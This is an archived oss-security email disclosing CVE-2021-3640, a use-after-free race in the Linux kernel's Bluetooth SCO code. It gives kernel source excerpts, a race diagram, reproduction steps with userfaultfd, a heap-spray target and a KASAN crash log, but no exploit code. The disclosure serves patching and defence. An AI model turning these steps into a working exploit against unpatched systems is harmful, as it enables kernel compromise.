X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["100110" "Thursday" "22" "July" "2021" "14:28:05" "+0800" "Lin Horse" "kylin.formalin@gmail.com" nil "1723" "[oss-security] CVE-2021-3640: Linux kernel: UAF in sco_send_frame function" nil nil nil "7" nil nil (number mark "U       kylin.formal Jul 22 1723/100110 " thread-indent "\"[oss-security] CVE-2021-3640: Linux kernel: UAF in sco_send_frame function\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CVE-2021-3640: Linux kernel: UAF in sco_send_frame function" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 3297 invoked by uid 550); 22 Jul 2021 10:52:28 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 9898 invoked from network); 22 Jul 2021 06:28:29 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to;
        bh=RMEW9H3xauZzHu5CBaaolAblmRerOMizOIP9B91J/x8=;
        b=YoR5IpyHt3IKUngwjp+ySGoLsGipUbHvexQYDtMClgS1cxkYRjzVTV5RGmThZpoG40
         jGM/4obhFLyeRRiAjkxtUoOaxC/kvBZaQVoEE4f7w7N9smQwFJRwfkBhhTn/ZLloU3l9
         47++dB+ImaAxhKV4ReLRH+54OBt+YPL0XdZZ/PI2ZGmcpekDhpPXiQez0StH7e1lh8Fo
         sfoz4ZtzUusypRsBu9lbLCulw9/OLK09D2IbvlG88TF2Zu2Lb9G0ie0p/szA/e2NCnNy
         pqpPbIkag++nmjc5oxAHnEBzcsfUR0fMqryk70OIVS/Dx/A6lG6oKsCYnFRgDuJg4/qh
         IY4A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=RMEW9H3xauZzHu5CBaaolAblmRerOMizOIP9B91J/x8=;
        b=uF5d8iPnoB9Jl0Gq+xLdYyQcZlYGtK5PshdWcNXNfepKCDsuAqtcuzR0KN8wMPT9DP
         7PCpFc18DvjdcydPujDrqsqlGLCWtUwE6bLmX2FPDNeKGvDZy/2FpAVxCKj0EeOq0jBp
         +65eGEYmWuDfXpi7FGC74rA2LVaKUVGb95g1XY1pMo54dQlXPoNwG9fPxTzycLJi86+N
         cxRfTwqU1t9ofKMZmgrnQK2HkyRryEjmBs98UAWi7ajaOUBxUgn0kg8Sv5h+MwTOoyhX
         bKAhQ5gkVDKbbOQdDd+BxkWkz/hNv/NaHP4/JLjgNly+waWQCuUZloxuLwfT+XpeukOp
         0h8Q==
X-Gm-Message-State: AOAM531Hdih/tOACpIDnKiN2GJAC5vzbjAS9Vaq/3DxeeO+xCURF4c4c
	k/MGoTYRgmO6ctfE6FJW8V+55xxoYR48uw18EZf8VbANPIyekRhrxwU=
X-Google-Smtp-Source: ABdhPJz3e04CBgm0BEpOcIlY5/muE++krY/UroZXlgc/FlIF66m7Y3IBamrM75MCX4GfLGbuYBYze/qpLrZeaRQDPLk=
X-Received: by 2002:a25:bc10:: with SMTP id i16mr48281286ybh.73.1626935296612;
 Wed, 21 Jul 2021 23:28:16 -0700 (PDT)
MIME-Version: 1.0
From: Lin Horse <kylin.formalin@gmail.com>
Date: Thu, 22 Jul 2021 14:28:05 +0800
Message-ID: <CAJjojJudFortx0aAUB9gDs1EybfzSwx_w2NLWPPEYvGge+MZUA@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/mixed; boundary="0000000000006d7a7c05c7b06491"
Subject: [oss-security] CVE-2021-3640: Linux kernel: UAF in sco_send_frame function

--0000000000006d7a7c05c7b06491
Content-Type: multipart/alternative; boundary="0000000000006d7a7b05c7b0648f"

--0000000000006d7a7b05c7b0648f
Content-Type: text/plain; charset="UTF-8"

Hello there,

Just like the previous, tedious race condition vulnerability caused by the
unexpected locking behavior (CVE-2021-3573), a similar one is found this
time.

=*=*=*=*=*=*=*=*=  BUG DETAILS  =*=*=*=*=*=*=*=*=

We can find another place that uses bh_lock_sock() in the Linux Bluetooth
stacks.

static void sco_conn_del(struct hci_conn *hcon, int err)
{
    ...
    if (sk) {
        sock_hold(sk);
        bh_lock_sock(sk);   // {1} LOCK
        sco_sock_clear_timer(sk);
        sco_chan_del(sk, err);
        bh_unlock_sock(sk); // {2} UNLOCK
        sco_sock_kill(sk);
        sock_put(sk);
    }
    ...
    hcon->sco_data = NULL;
    kfree(conn);
}

Between these lock pairs, sco_chan_del() is called, which will delete the
channel associated with this sk.
At the end of this function, the conn will be released by kfree().

Similar to the CVE-2021-3573, there is another thread that can be
controlled by the attacker. It will wait for the kfree() and thereafter,
race to cause UAF.

For example, the sco_sock_sendmsg() function.

static int sco_sock_sendmsg(struct socket *sock, struct msghdr *msg,
                size_t len)
{
    ...

    lock_sock(sk);

    if (sk->sk_state == BT_CONNECTED)
        err = sco_send_frame(sk, msg, len);
    else
        err = -ENOTCONN;

    release_sock(sk);
    return err;
}

static int sco_send_frame(struct sock *sk, struct msghdr *msg, int len)
{
    ...

    skb = bt_skb_send_alloc(sk, len, msg->msg_flags & MSG_DONTWAIT, &err);
    if (!skb)
        return err;

    if (memcpy_from_msg(skb_put(skb, len), msg, len)) { // {3}
        kfree_skb(skb);
        return -EFAULT;
    }

    hci_send_sco(conn->hcon, skb);

    ...
}

As you can see, the attacker can adopt userfaultfd technique to stop the
thread at {3} point.

Because the sco_send_frame() is protected by the lock_sock() and
release_sock(), which will not block the sco_conn_del() to release the conn.

One vulnerable race window is shown below:

sco_sock_sendmsg thread        |    sco_conn_del thread
                               |
                               |
lock_sock(sk);                 |
                               |
...                            |    bh_lock_sock(sk);
                               |    ...
                               |    bh_unlock_sock(sk);
                               |    ...
                               |    kfree(conn);
// UAF           |
hci_send_sco(conn->hcon, skb); |
                               |
                               |

=*=*=*=*=*=*=*=*=  BUG EFFECTS  =*=*=*=*=*=*=*=*=

Similar to CVE-2021-3573, the attacker may stably cause the UAF and do
further exploitation.

As the sco_conn struct is pretty juicy (two previous data pointers inside)

struct sco_conn {
    struct hci_conn    *hcon;

    spinlock_t    lock;
    struct sock    *sk;

    unsigned int    mtu;
};

The attacker can easily spray these kmalloc-32 objects with the malicious
payload, with CAP_NET_ADMIN privilege.

The provided POC code can cause the crash report below:

[   62.856933]
==================================================================
[   62.857336] BUG: KASAN: use-after-free in sco_sock_sendmsg+0x1d6/0x2c0
[   62.858202] Read of size 8 at addr ffff888002478540 by task
poc.sco.new/120
[   62.858663]
[   62.859014] CPU: 0 PID: 120 Comm: poc.sco.new Not tainted 5.13.0+ #1
[   62.859405] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS
1.10.2-1ubuntu1 04/01/2014
[   62.859884] Call Trace:
[   62.860168]  dump_stack_lvl+0x73/0x9e
[   62.860525]  print_address_description+0x82/0x3a0
[   62.860879]  __kasan_report+0x154/0x240
[   62.861115]  ? lock_sock_nested+0x100/0x140
[   62.861446]  ? sco_sock_sendmsg+0x1d6/0x2c0
[   62.861811]  kasan_report+0x45/0x60
[   62.862133]  sco_sock_sendmsg+0x1d6/0x2c0
[   62.862461]  ? sco_sock_getsockopt+0x410/0x410
[   62.862748]  ? inet_send_prepare+0x190/0x190
[   62.863000]  sock_write_iter+0x21b/0x230
[   62.863232]  vfs_write+0x53a/0x5c0
[   62.863479]  ksys_write+0x8b/0x100
[   62.863723]  ? __fpregs_load_activate+0xc2/0x150
[   62.864017]  do_syscall_64+0x43/0x90
[   62.864287]  entry_SYSCALL_64_after_hwframe+0x44/0xae
[   62.864615] RIP: 0033:0x7f9b6c8d4abf
[   62.865073] Code: 89 54 24 18 48 89 74 24 10 89 7c 24 08 e8 69 fd ff ff
48 8b 54 24 18 48 8b 74 24 10 41 89 c0 8b 7c 24 08 b8 01 00 00 00 0f 05
<48> 3d 00 f0 ff ff 77 2d 44 89 c7 48 89 44 24 08 e8 9c fd ff ff 48
[   62.865843] RSP: 002b:00007ffd6b0133a0 EFLAGS: 00000293 ORIG_RAX:
0000000000000001
[   62.866304] RAX: ffffffffffffffda RBX: 000055be494024e0 RCX:
00007f9b6c8d4abf
[   62.866660] RDX: 0000000000000010 RSI: 00007f9b6c90e000 RDI:
0000000000000005
[   62.866992] RBP: 00007ffd6b013480 R08: 0000000000000000 R09:
00007f9b6c703700
[   62.867293] R10: 00007f9b6c7039d0 R11: 0000000000000293 R12:
000055be49400d10
[   62.867576] R13: 00007ffd6b013570 R14: 0000000000000000 R15:
0000000000000000
[   62.868106]
[   62.868302] Allocated by task 120:
[   62.868586]  ____kasan_kmalloc+0xb5/0xe0
[   62.868999]  kmem_cache_alloc_trace+0x12d/0x210
[   62.869349]  sco_sock_connect+0x1f7/0x4a0
[   62.869647]  __sys_connect+0x16f/0x1a0
[   62.869944]  __x64_sys_connect+0x38/0x40
[   62.870243]  do_syscall_64+0x43/0x90
[   62.870556]  entry_SYSCALL_64_after_hwframe+0x44/0xae
[   62.870883]
[   62.871020] Freed by task 125:
[   62.871192]  kasan_set_track+0x3d/0x70
[   62.871432]  kasan_set_free_info+0x1f/0x40
[   62.871708]  ____kasan_slab_free+0x111/0x150
[   62.871956]  kfree+0xf3/0x2d0
[   62.872208]  hci_conn_hash_flush+0xbf/0x120
[   62.872529]  hci_dev_do_close+0x51a/0x870
[   62.872789]  hci_unregister_dev+0x23a/0xb70
[   62.873054]  vhci_release+0x3f/0x70
[   62.873334]  __fput+0x197/0x360
[   62.873598]  task_work_run+0xc0/0xe0
[   62.873919]  exit_to_user_mode_prepare+0xf0/0x130
[   62.874253]  syscall_exit_to_user_mode+0x20/0x40
[   62.874511]  do_syscall_64+0x52/0x90
[   62.874768]  entry_SYSCALL_64_after_hwframe+0x44/0xae
[   62.875160]
[   62.875352] The buggy address belongs to the object at ffff888002478540
[   62.875352]  which belongs to the cache kmalloc-32 of size 32
[   62.875900] The buggy address is located 0 bytes inside of
[   62.875900]  32-byte region [ffff888002478540, ffff888002478560)
[   62.876472] The buggy address belongs to the page:
[   62.876885] page:00000000db13206d refcount:1 mapcount:0
mapping:0000000000000000 index:0x0 pfn:0x2478
[   62.877481] flags: 0x100000000000200(slab|node=0|zone=1)
[   62.878361] raw: 0100000000000200 ffffea0000078d00 0000000e0000000e
ffff888001041500
[   62.878901] raw: 0000000000000000 0000000080400040 00000001ffffffff
0000000000000000
[   62.879313] page dumped because: kasan: bad access detected
[   62.879588]
[   62.879704] Memory state around the buggy address:
[   62.880003]  ffff888002478400: fb fb fb fb fc fc fc fc fb fb fb fb fc fc
fc fc
[   62.880286]  ffff888002478480: fb fb fb fb fc fc fc fc fb fb fb fb fc fc
fc fc
[   62.880532] >ffff888002478500: fa fb fb fb fc fc fc fc fa fb fb fb fc fc
fc fc
[   62.880785]                                            ^
[   62.881199]  ffff888002478580: 00 00 00 00 fc fc fc fc 00 00 00 fc fc fc
fc fc
[   62.881457]  ffff888002478600: 00 00 00 fc fc fc fc fc 00 00 00 fc fc fc
fc fc
[   62.881716]
==================================================================
[   62.881991] Disabling lock debugging due to kernel taint
[   62.883072] BUG: unable to handle page fault for address:
fffffbfff22fa79f
[   62.883427] #PF: supervisor read access in kernel mode
[   62.883774] #PF: error_code(0x0000) - not-present page
[   62.884165] PGD 36fd0067 P4D 36fd0067 PUD 36df4067 PMD 0
[   62.884827] Oops: 0000 [#1] SMP KASAN NOPTI
[   62.885132] CPU: 0 PID: 120 Comm: poc.sco.new Tainted: G    B
  5.13.0+ #1
[   62.885528] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS
1.10.2-1ubuntu1 04/01/2014
[   62.885901] RIP: 0010:__asan_store8+0x6c/0xb0
[   62.886184] Code: be 00 00 00 00 00 fc ff df 0f be 14 32 85 d2 74 07 83
e0 07 39 d0 7d 29 c3 48 89 fe 48 c1 ee 03 48 ba 00 00 00 00 00 fc ff df
<80> 3c 16 00 75 11 48 89 c6 48 c1 ee 03 0f be 14 16 85 d2 75 d2 eb
[   62.886853] RSP: 0018:ffff8880030ffbf8 EFLAGS: 00000006
[   62.887244] RAX: ffffffff917d3d02 RBX: 0000000000040000 RCX:
ffffffffba337d86
[   62.887524] RDX: dffffc0000000000 RSI: 1ffffffff22fa79f RDI:
ffffffff917d3cfb
[   62.887855] RBP: 0000000000000030 R08: dffffc0000000000 R09:
0000000000000007
[   62.888162] R10: ffffed100035159c R11: 00000000000000fb R12:
ffffffff917a1b4b
[   62.888476] R13: fffffffffffffff8 R14: ffff888001a8acdc R15:
ffff888036432188
[   62.888838] FS:  00007f9b6c704740(0000) GS:ffff888036400000(0000)
knlGS:0000000000000000
[   62.889331] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   62.889908] CR2: fffffbfff22fa79f CR3: 00000000011c0000 CR4:
00000000003006f0
[   62.890341] Call Trace:
[   62.890617]  queued_spin_lock_slowpath+0x286/0x410
[   62.890915]  _raw_spin_lock_irqsave+0x9f/0xb0
[   62.891201]  skb_queue_tail+0x1c/0x90
[   62.891548]  hci_send_sco+0xd6/0x110
[   62.891871]  sco_sock_sendmsg+0x1e1/0x2c0
[   62.892170]  ? sco_sock_getsockopt+0x410/0x410
[   62.892511]  ? inet_send_prepare+0x190/0x190
[   62.892796]  sock_write_iter+0x21b/0x230
[   62.893156]  vfs_write+0x53a/0x5c0
[   62.893533]  ksys_write+0x8b/0x100
[   62.893870]  ? __fpregs_load_activate+0xc2/0x150
[   62.894258]  do_syscall_64+0x43/0x90
[   62.894523]  entry_SYSCALL_64_after_hwframe+0x44/0xae
[   62.894929] RIP: 0033:0x7f9b6c8d4abf
[   62.895178] Code: 89 54 24 18 48 89 74 24 10 89 7c 24 08 e8 69 fd ff ff
48 8b 54 24 18 48 8b 74 24 10 41 89 c0 8b 7c 24 08 b8 01 00 00 00 0f 05
<48> 3d 00 f0 ff ff 77 2d 44 89 c7 48 89 44 24 08 e8 9c fd ff ff 48
[   62.895930] RSP: 002b:00007ffd6b0133a0 EFLAGS: 00000293 ORIG_RAX:
0000000000000001
[   62.896396] RAX: ffffffffffffffda RBX: 000055be494024e0 RCX:
00007f9b6c8d4abf
[   62.896749] RDX: 0000000000000010 RSI: 00007f9b6c90e000 RDI:
0000000000000005
[   62.897081] RBP: 00007ffd6b013480 R08: 0000000000000000 R09:
00007f9b6c703700
[   62.897430] R10: 00007f9b6c7039d0 R11: 0000000000000293 R12:
000055be49400d10
[   62.897814] R13: 00007ffd6b013570 R14: 0000000000000000 R15:
0000000000000000
[   62.898239] Modules linked in:
[   62.898623] CR2: fffffbfff22fa79f
[   62.899350] ---[ end trace e705e323d4c8b589 ]---
[   62.899645] RIP: 0010:__asan_store8+0x6c/0xb0
[   62.899918] Code: be 00 00 00 00 00 fc ff df 0f be 14 32 85 d2 74 07 83
e0 07 39 d0 7d 29 c3 48 89 fe 48 c1 ee 03 48 ba 00 00 00 00 00 fc ff df
<80> 3c 16 00 75 11 48 89 c6 48 c1 ee 03 0f be 14 16 85 d2 75 d2 eb
[   62.900625] RSP: 0018:ffff8880030ffbf8 EFLAGS: 00000006
[   62.900997] RAX: ffffffff917d3d02 RBX: 0000000000040000 RCX:
ffffffffba337d86
[   62.901276] RDX: dffffc0000000000 RSI: 1ffffffff22fa79f RDI:
ffffffff917d3cfb
[   62.901700] RBP: 0000000000000030 R08: dffffc0000000000 R09:
0000000000000007
[   62.902083] R10: ffffed100035159c R11: 00000000000000fb R12:
ffffffff917a1b4b
[   62.902496] R13: fffffffffffffff8 R14: ffff888001a8acdc R15:
ffff888036432188
[   62.902820] FS:  00007f9b6c704740(0000) GS:ffff888036400000(0000)
knlGS:0000000000000000
[   62.903228] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   62.903566] CR2: fffffbfff22fa79f CR3: 00000000011c0000 CR4:
00000000003006f0

=*=*=*=*=*=*=*=*=  BUG REPRODUCE  =*=*=*=*=*=*=*=*=

As above introduced, this race condition is highly controllable with
userfaultfd techniques.

The attacker has to fake an SCO connection and then calls
sco_sock_sendmsg() with the expected controllable faulting page.
After that, the attacker just needs to detach the controller to call
sco_conn_del().

The calling trace is:

hci_unregister_dev() -> hci_dev_do_close() -> hci_conn_hash_flush() ->
hci_disconn_cfm() ->
sco_disconn_cfm() -> sco_conn_del().

You can refer to the provided POC code for the details.

=*=*=*=*=*=*=*=*=  Timeline  =*=*=*=*=*=*=*=*=

2021-07-08: Bug reported to security@kernel.org and
linux-distros@vs.openwall.org
2021-07-09: CVE-2021-3640 is assigned
2021-07-22: 14 days of the embargo is over

One sad thing is that the bluez team is currently focused on fixing up the
CVE-2021-3573, which I failed to properly patched, and the patch for this
new is not yet fully discussed.
I hope the patch will be settled down and merged to the mainline in the
near future.

=*=*=*=*=*=*=*=*=  Credt  =*=*=*=*=*=*=*=*=
LinMa@BlockSec Team

Best Regards

--0000000000006d7a7b05c7b0648f
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

<div dir=3D"ltr"><font face=3D"monospace">Hello there,<br><br>Just like the=
 previous, tedious race condition vulnerability caused by the unexpected lo=
cking behavior (CVE-2021-3573), a similar one is found this time.<br><br>=
=3D*=3D*=3D*=3D*=3D*=3D*=3D*=3D*=3D =C2=A0BUG DETAILS =C2=A0=3D*=3D*=3D*=3D=
*=3D*=3D*=3D*=3D*=3D<br><br>We can find another place that uses bh_lock_soc=
k() in the Linux Bluetooth stacks.<br><br>static void sco_conn_del(struct h=
ci_conn *hcon, int err)<br>{<br>=C2=A0 =C2=A0 ...<br>=C2=A0 =C2=A0 if (sk) =
{<br>=C2=A0 =C2=A0 =C2=A0 =C2=A0 sock_hold(sk);<br>=C2=A0 =C2=A0 =C2=A0 =C2=
=A0 bh_lock_sock(sk); =C2=A0 // {1} LOCK<br>=C2=A0 =C2=A0 =C2=A0 =C2=A0 sco=
_sock_clear_timer(sk);<br>=C2=A0 =C2=A0 =C2=A0 =C2=A0 sco_chan_del(sk, err)=
;<br>=C2=A0 =C2=A0 =C2=A0 =C2=A0 bh_unlock_sock(sk); // {2} UNLOCK<br>=C2=
=A0 =C2=A0 =C2=A0 =C2=A0 sco_sock_kill(sk);<br>=C2=A0 =C2=A0 =C2=A0 =C2=A0 =
sock_put(sk);<br>=C2=A0 =C2=A0 }<br>=C2=A0 =C2=A0 ...<br>=C2=A0 =C2=A0 hcon=
-&gt;sco_data =3D NULL;<br>=C2=A0 =C2=A0 kfree(conn);<br>}<br><br>Between t=
hese lock pairs, sco_chan_del() is called, which will delete the channel as=
sociated with this sk.<br>At the end of this function, the conn will be rel=
eased by kfree().<br><br>Similar to the CVE-2021-3573, there is another thr=
ead that can be controlled by the attacker. It will wait for the kfree() an=
d thereafter, race to cause UAF.<br><br>For example, the sco_sock_sendmsg()=
 function.<br><br>static int sco_sock_sendmsg(struct socket *sock, struct m=
sghdr *msg,<br>=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 size=
_t len)<br>{<br>=C2=A0 =C2=A0 ...<br><br>=C2=A0 =C2=A0 lock_sock(sk);<br><b=
r>=C2=A0 =C2=A0 if (sk-&gt;sk_state =3D=3D BT_CONNECTED)<br>=C2=A0 =C2=A0 =
=C2=A0 =C2=A0 err =3D sco_send_frame(sk, msg, len);<br>=C2=A0 =C2=A0 else<b=
r>=C2=A0 =C2=A0 =C2=A0 =C2=A0 err =3D -ENOTCONN;<br><br>=C2=A0 =C2=A0 relea=
se_sock(sk);<br>=C2=A0 =C2=A0 return err;<br>}<br><br>static int sco_send_f=
rame(struct sock *sk, struct msghdr *msg, int len)<br>{<br>=C2=A0 =C2=A0 ..=
.<br><br>=C2=A0 =C2=A0 skb =3D bt_skb_send_alloc(sk, len, msg-&gt;msg_flags=
 &amp; MSG_DONTWAIT, &amp;err);<br>=C2=A0 =C2=A0 if (!skb)<br>=C2=A0 =C2=A0=
 =C2=A0 =C2=A0 return err;<br><br>=C2=A0 =C2=A0 if (memcpy_from_msg(skb_put=
(skb, len), msg, len)) { // {3}<br>=C2=A0 =C2=A0 =C2=A0 =C2=A0 kfree_skb(sk=
b);<br>=C2=A0 =C2=A0 =C2=A0 =C2=A0 return -EFAULT;<br>=C2=A0 =C2=A0 }<br><b=
r>=C2=A0 =C2=A0 hci_send_sco(conn-&gt;hcon, skb);<br><br>=C2=A0 =C2=A0 ...<=
br>}<br><br>As you can see, the attacker can adopt userfaultfd technique to=
 stop the thread at {3} point.<br><br>Because the sco_send_frame() is prote=
cted by the lock_sock() and release_sock(), which will not block the sco_co=
nn_del() to release the conn.<br><br>One vulnerable race window is shown be=
low:<br><br>sco_sock_sendmsg thread =C2=A0 =C2=A0 =C2=A0 =C2=A0| =C2=A0 =C2=
=A0sco_conn_del thread<br>=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =
=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0|<br>=C2=A0 =
=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0|<br>lock_sock(sk); =C2=A0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 | =C2=A0 =C2=A0<br>=C2=A0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =
=C2=A0 =C2=A0|<br>... =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0| =C2=A0 =C2=A0bh_lock_sock(sk=
);<br>=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=
 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0| =C2=A0 =C2=A0...<br>=C2=A0 =C2=
=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =
=C2=A0 =C2=A0 =C2=A0 =C2=A0| =C2=A0 =C2=A0bh_unlock_sock(sk);<br>=C2=A0 =C2=
=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =
=C2=A0 =C2=A0 =C2=A0 =C2=A0| =C2=A0 =C2=A0...<br>=C2=A0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =
=C2=A0 =C2=A0| =C2=A0 =C2=A0kfree(conn);<br>// UAF=C2=A0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A0|<br>hci_send_sco(conn-&gt;hcon, skb); |<br>=C2=A0 =C2=A0 =
=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A0 =C2=A0|<br>=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0|<br><br>=
=3D*=3D*=3D*=3D*=3D*=3D*=3D*=3D*=3D =C2=A0BUG EFFECTS =C2=A0=3D*=3D*=3D*=3D=
*=3D*=3D*=3D*=3D*=3D<br><br>Similar to CVE-2021-3573, the attacker may stab=
ly cause the UAF and do further exploitation.<br><br>As the sco_conn struct=
 is pretty juicy (two previous data pointers inside)<br><br>struct sco_conn=
 {<br>=C2=A0 =C2=A0 struct hci_conn =C2=A0 =C2=A0*hcon;<br><br>=C2=A0 =C2=
=A0 spinlock_t =C2=A0 =C2=A0lock;<br>=C2=A0 =C2=A0 struct sock =C2=A0 =C2=
=A0*sk;<br><br>=C2=A0 =C2=A0 unsigned int =C2=A0 =C2=A0mtu;<br>};<br><br>Th=
e attacker can easily spray these kmalloc-32 objects with the malicious pay=
load, with CAP_NET_ADMIN privilege.<br><br>The provided POC code can cause =
the crash report below:<br><br>[ =C2=A0 62.856933] =3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D<br>[ =C2=A0 62.857336] BUG: KASAN: use-after-free =
in sco_sock_sendmsg+0x1d6/0x2c0<br>[ =C2=A0 62.858202] Read of size 8 at ad=
dr ffff888002478540 by task poc.sco.new/120<br>[ =C2=A0 62.858663]<br>[ =C2=
=A0 62.859014] CPU: 0 PID: 120 Comm: poc.sco.new Not tainted 5.13.0+ #1<br>=
[ =C2=A0 62.859405] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), =
BIOS 1.10.2-1ubuntu1 04/01/2014<br>[ =C2=A0 62.859884] Call Trace:<br>[ =C2=
=A0 62.860168] =C2=A0dump_stack_lvl+0x73/0x9e<br>[ =C2=A0 62.860525] =C2=A0=
print_address_description+0x82/0x3a0<br>[ =C2=A0 62.860879] =C2=A0__kasan_r=
eport+0x154/0x240<br>[ =C2=A0 62.861115] =C2=A0? lock_sock_nested+0x100/0x1=
40<br>[ =C2=A0 62.861446] =C2=A0? sco_sock_sendmsg+0x1d6/0x2c0<br>[ =C2=A0 =
62.861811] =C2=A0kasan_report+0x45/0x60<br>[ =C2=A0 62.862133] =C2=A0sco_so=
ck_sendmsg+0x1d6/0x2c0<br>[ =C2=A0 62.862461] =C2=A0? sco_sock_getsockopt+0=
x410/0x410<br>[ =C2=A0 62.862748] =C2=A0? inet_send_prepare+0x190/0x190<br>=
[ =C2=A0 62.863000] =C2=A0sock_write_iter+0x21b/0x230<br>[ =C2=A0 62.863232=
] =C2=A0vfs_write+0x53a/0x5c0<br>[ =C2=A0 62.863479] =C2=A0ksys_write+0x8b/=
0x100<br>[ =C2=A0 62.863723] =C2=A0? __fpregs_load_activate+0xc2/0x150<br>[=
 =C2=A0 62.864017] =C2=A0do_syscall_64+0x43/0x90<br>[ =C2=A0 62.864287] =C2=
=A0entry_SYSCALL_64_after_hwframe+0x44/0xae<br>[ =C2=A0 62.864615] RIP: 003=
3:0x7f9b6c8d4abf<br>[ =C2=A0 62.865073] Code: 89 54 24 18 48 89 74 24 10 89=
 7c 24 08 e8 69 fd ff ff 48 8b 54 24 18 48 8b 74 24 10 41 89 c0 8b 7c 24 08=
 b8 01 00 00 00 0f 05 &lt;48&gt; 3d 00 f0 ff ff 77 2d 44 89 c7 48 89 44 24 =
08 e8 9c fd ff ff 48<br>[ =C2=A0 62.865843] RSP: 002b:00007ffd6b0133a0 EFLA=
GS: 00000293 ORIG_RAX: 0000000000000001<br>[ =C2=A0 62.866304] RAX: fffffff=
fffffffda RBX: 000055be494024e0 RCX: 00007f9b6c8d4abf<br>[ =C2=A0 62.866660=
] RDX: 0000000000000010 RSI: 00007f9b6c90e000 RDI: 0000000000000005<br>[ =
=C2=A0 62.866992] RBP: 00007ffd6b013480 R08: 0000000000000000 R09: 00007f9b=
6c703700<br>[ =C2=A0 62.867293] R10: 00007f9b6c7039d0 R11: 0000000000000293=
 R12: 000055be49400d10<br>[ =C2=A0 62.867576] R13: 00007ffd6b013570 R14: 00=
00000000000000 R15: 0000000000000000<br>[ =C2=A0 62.868106]<br>[ =C2=A0 62.=
868302] Allocated by task 120:<br>[ =C2=A0 62.868586] =C2=A0____kasan_kmall=
oc+0xb5/0xe0<br>[ =C2=A0 62.868999] =C2=A0kmem_cache_alloc_trace+0x12d/0x21=
0<br>[ =C2=A0 62.869349] =C2=A0sco_sock_connect+0x1f7/0x4a0<br>[ =C2=A0 62.=
869647] =C2=A0__sys_connect+0x16f/0x1a0<br>[ =C2=A0 62.869944] =C2=A0__x64_=
sys_connect+0x38/0x40<br>[ =C2=A0 62.870243] =C2=A0do_syscall_64+0x43/0x90<=
br>[ =C2=A0 62.870556] =C2=A0entry_SYSCALL_64_after_hwframe+0x44/0xae<br>[ =
=C2=A0 62.870883]<br>[ =C2=A0 62.871020] Freed by task 125:<br>[ =C2=A0 62.=
871192] =C2=A0kasan_set_track+0x3d/0x70<br>[ =C2=A0 62.871432] =C2=A0kasan_=
set_free_info+0x1f/0x40<br>[ =C2=A0 62.871708] =C2=A0____kasan_slab_free+0x=
111/0x150<br>[ =C2=A0 62.871956] =C2=A0kfree+0xf3/0x2d0<br>[ =C2=A0 62.8722=
08] =C2=A0hci_conn_hash_flush+0xbf/0x120<br>[ =C2=A0 62.872529] =C2=A0hci_d=
